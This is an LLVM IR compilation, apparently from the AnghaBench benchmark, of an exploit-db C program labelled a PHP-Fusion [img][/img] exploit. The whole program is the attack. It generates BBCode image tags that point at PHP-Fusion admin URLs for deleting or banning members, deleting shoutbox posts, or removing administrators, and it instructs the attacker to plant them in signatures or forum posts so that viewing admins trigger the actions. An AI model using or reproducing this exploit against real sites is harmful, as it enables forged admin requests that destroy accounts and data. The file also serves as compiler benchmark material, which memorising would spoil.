; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_1135.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_1135.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.1 = private unnamed_addr constant [32 x i8] c"PHP-Fusion [img][/img] exploit\0A\00", align 1
@.str.2 = private unnamed_addr constant [47 x i8] c"Coded by Easyex from the Dark Assassins crew\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [12 x i8] c"exploit.txt\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"w+\00", align 1
@.str.5 = private unnamed_addr constant [29 x i8] c"[-] Error opening log file.\0A\00", align 1
@.str.6 = private unnamed_addr constant [29 x i8] c"Discovered/Coded by Easyex\0A\0A\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"6.x\00", align 1
@.str.8 = private unnamed_addr constant [16 x i8] c"administration/\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"5.x\00", align 1
@.str.10 = private unnamed_addr constant [14 x i8] c"fusion_admin/\00", align 1
@.str.11 = private unnamed_addr constant [29 x i8] c"[-] Error, Invalid version!\0A\00", align 1
@.str.12 = private unnamed_addr constant [8 x i8] c"deluser\00", align 1
@.str.13 = private unnamed_addr constant [55 x i8] c"members.php?step=delete&sortby=all&rowstart=0&user_id=\00", align 1
@.str.14 = private unnamed_addr constant [45 x i8] c"You have selected to delete %s > %s user(s)\0A\00", align 1
@.str.15 = private unnamed_addr constant [8 x i8] c"banuser\00", align 1
@.str.16 = private unnamed_addr constant [59 x i8] c"members.php?step=ban&act=on&sortby=all&rowstart=0&user_id=\00", align 1
@.str.17 = private unnamed_addr constant [42 x i8] c"You have selected to ban %s > %s user(s)\0A\00", align 1
@.str.18 = private unnamed_addr constant [9 x i8] c"delshout\00", align 1
@.str.19 = private unnamed_addr constant [37 x i8] c"shoutbox.php?action=delete&shout_id=\00", align 1
@.str.20 = private unnamed_addr constant [54 x i8] c"You have selected to delete %s > %s shoutbox post(s)\0A\00", align 1
@.str.21 = private unnamed_addr constant [9 x i8] c"deladmin\00", align 1
@.str.22 = private unnamed_addr constant [27 x i8] c"administrators.php?remove=\00", align 1
@.str.23 = private unnamed_addr constant [53 x i8] c"You have selected to delete %s > %s administator(s)\0A\00", align 1
@.str.24 = private unnamed_addr constant [28 x i8] c"[-] Error, Invalid option!\0A\00", align 1
@.str.25 = private unnamed_addr constant [32 x i8] c"[+] Generating image codes...\0A\0A\00", align 1
@.str.26 = private unnamed_addr constant [88 x i8] c"Add the following lines of code into your signature, forum post or in a comment post:\0A\0A\00", align 1
@.str.27 = private unnamed_addr constant [20 x i8] c"[img]%s%s%s%d[/img]\00", align 1
@.str.28 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.29 = private unnamed_addr constant [39 x i8] c"[+] Completed & logged to exploit.txt\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca [512 x i8], align 16
  %8 = alloca [512 x i8], align 16
  %9 = alloca [512 x i8], align 16
  %10 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = call i32 @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  %12 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0))
  %13 = call i32 @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.2, i64 0, i64 0))
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 6
  br i1 %15, label %16, label %18

16:                                               ; preds = %2
  %17 = call i32 (...) @usage()
  br label %18

18:                                               ; preds = %16, %2
  %19 = call i32* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0))
  store i32* %19, i32** %10, align 8
  %20 = load i32*, i32** %10, align 8
  %21 = icmp eq i32* %20, null
  br i1 %21, label %22, label %25

22:                                               ; preds = %18
  %23 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.5, i64 0, i64 0))
  %24 = call i32 @exit(i32 -1) #3
  unreachable

25:                                               ; preds = %18
  %26 = load i32*, i32** %10, align 8
  %27 = call i32 (i32*, i8*, ...) @fprintf(i32* %26, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0))
  %28 = load i32*, i32** %10, align 8
  %29 = call i32 (i32*, i8*, ...) @fprintf(i32* %28, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.6, i64 0, i64 0))
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 1
  %32 = load i8*, i8** %31, align 8
  %33 = call i64 @strcmp(i8* %32, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0))
  %34 = icmp eq i64 %33, 0
  br i1 %34, label %35, label %38

35:                                               ; preds = %25
  %36 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %37 = call i32 @strncpy(i8* %36, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.8, i64 0, i64 0), i32 512)
  br label %51

38:                                               ; preds = %25
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 1
  %41 = load i8*, i8** %40, align 8
  %42 = call i64 @strcmp(i8* %41, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0))
  %43 = icmp eq i64 %42, 0
  br i1 %43, label %44, label %47

44:                                               ; preds = %38
  %45 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %46 = call i32 @strncpy(i8* %45, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.10, i64 0, i64 0), i32 512)
  br label %50

47:                                               ; preds = %38
  %48 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.11, i64 0, i64 0))
  %49 = call i32 @exit(i32 -1) #3
  unreachable

50:                                               ; preds = %44
  br label %51

51:                                               ; preds = %50, %35
  %52 = load i8**, i8*** %5, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 3
  %54 = load i8*, i8** %53, align 8
  %55 = call i64 @strcmp(i8* %54, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.12, i64 0, i64 0))
  %56 = icmp eq i64 %55, 0
  br i1 %56, label %57, label %68

57:                                               ; preds = %51
  %58 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %59 = call i32 @strncpy(i8* %58, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.13, i64 0, i64 0), i32 512)
  %60 = load i32*, i32** %10, align 8
  %61 = load i8**, i8*** %5, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 4
  %63 = load i8*, i8** %62, align 8
  %64 = load i8**, i8*** %5, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 5
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 (i32*, i8*, ...) @fprintf(i32* %60, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.14, i64 0, i64 0), i8* %63, i8* %66)
  br label %125

68:                                               ; preds = %51
  %69 = load i8**, i8*** %5, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 3
  %71 = load i8*, i8** %70, align 8
  %72 = call i64 @strcmp(i8* %71, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.15, i64 0, i64 0))
  %73 = icmp eq i64 %72, 0
  br i1 %73, label %74, label %85

74:                                               ; preds = %68
  %75 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %76 = call i32 @strncpy(i8* %75, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.16, i64 0, i64 0), i32 512)
  %77 = load i32*, i32** %10, align 8
  %78 = load i8**, i8*** %5, align 8
  %79 = getelementptr inbounds i8*, i8** %78, i64 4
  %80 = load i8*, i8** %79, align 8
  %81 = load i8**, i8*** %5, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 5
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 (i32*, i8*, ...) @fprintf(i32* %77, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.17, i64 0, i64 0), i8* %80, i8* %83)
  br label %124

85:                                               ; preds = %68
  %86 = load i8**, i8*** %5, align 8
  %87 = getelementptr inbounds i8*, i8** %86, i64 3
  %88 = load i8*, i8** %87, align 8
  %89 = call i64 @strcmp(i8* %88, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.18, i64 0, i64 0))
  %90 = icmp eq i64 %89, 0
  br i1 %90, label %91, label %102

91:                                               ; preds = %85
  %92 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %93 = call i32 @strncpy(i8* %92, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.19, i64 0, i64 0), i32 512)
  %94 = load i32*, i32** %10, align 8
  %95 = load i8**, i8*** %5, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 4
  %97 = load i8*, i8** %96, align 8
  %98 = load i8**, i8*** %5, align 8
  %99 = getelementptr inbounds i8*, i8** %98, i64 5
  %100 = load i8*, i8** %99, align 8
  %101 = call i32 (i32*, i8*, ...) @fprintf(i32* %94, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.20, i64 0, i64 0), i8* %97, i8* %100)
  br label %123

102:                                              ; preds = %85
  %103 = load i8**, i8*** %5, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 3
  %105 = load i8*, i8** %104, align 8
  %106 = call i64 @strcmp(i8* %105, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i64 0, i64 0))
  %107 = icmp eq i64 %106, 0
  br i1 %107, label %108, label %119

108:                                              ; preds = %102
  %109 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %110 = call i32 @strncpy(i8* %109, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.22, i64 0, i64 0), i32 512)
  %111 = load i32*, i32** %10, align 8
  %112 = load i8**, i8*** %5, align 8
  %113 = getelementptr inbounds i8*, i8** %112, i64 4
  %114 = load i8*, i8** %113, align 8
  %115 = load i8**, i8*** %5, align 8
  %116 = getelementptr inbounds i8*, i8** %115, i64 5
  %117 = load i8*, i8** %116, align 8
  %118 = call i32 (i32*, i8*, ...) @fprintf(i32* %111, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.23, i64 0, i64 0), i8* %114, i8* %117)
  br label %122

119:                                              ; preds = %102
  %120 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.24, i64 0, i64 0))
  %121 = call i32 @exit(i32 -1) #3
  unreachable

122:                                              ; preds = %108
  br label %123

123:                                              ; preds = %122, %91
  br label %124

124:                                              ; preds = %123, %74
  br label %125

125:                                              ; preds = %124, %57
  %126 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.25, i64 0, i64 0))
  %127 = load i32*, i32** %10, align 8
  %128 = call i32 (i32*, i8*, ...) @fprintf(i32* %127, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.26, i64 0, i64 0))
  %129 = load i8**, i8*** %5, align 8
  %130 = getelementptr inbounds i8*, i8** %129, i64 4
  %131 = load i8*, i8** %130, align 8
  %132 = call i32 @atoi(i8* %131)
  store i32 %132, i32* %6, align 4
  br label %133

133:                                              ; preds = %152, %125
  %134 = load i32, i32* %6, align 4
  %135 = load i8**, i8*** %5, align 8
  %136 = getelementptr inbounds i8*, i8** %135, i64 5
  %137 = load i8*, i8** %136, align 8
  %138 = call i32 @atoi(i8* %137)
  %139 = icmp sle i32 %134, %138
  br i1 %139, label %140, label %155

140:                                              ; preds = %133
  %141 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %142 = load i8**, i8*** %5, align 8
  %143 = getelementptr inbounds i8*, i8** %142, i64 2
  %144 = load i8*, i8** %143, align 8
  %145 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %146 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %147 = load i32, i32* %6, align 4
  %148 = call i32 @sprintf(i8* %141, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.27, i64 0, i64 0), i8* %144, i8* %145, i8* %146, i32 %147)
  %149 = load i32*, i32** %10, align 8
  %150 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %151 = call i32 (i32*, i8*, ...) @fprintf(i32* %149, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.28, i64 0, i64 0), i8* %150)
  br label %152

152:                                              ; preds = %140
  %153 = load i32, i32* %6, align 4
  %154 = add nsw i32 %153, 1
  store i32 %154, i32* %6, align 4
  br label %133

155:                                              ; preds = %133
  %156 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.29, i64 0, i64 0))
  %157 = call i32 @exit(i32 1) #3
  unreachable
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @usage(...) #1

declare dso_local i32* @fopen(i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @fprintf(i32*, i8*, ...) #1

declare dso_local i64 @strcmp(i8*, i8*) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
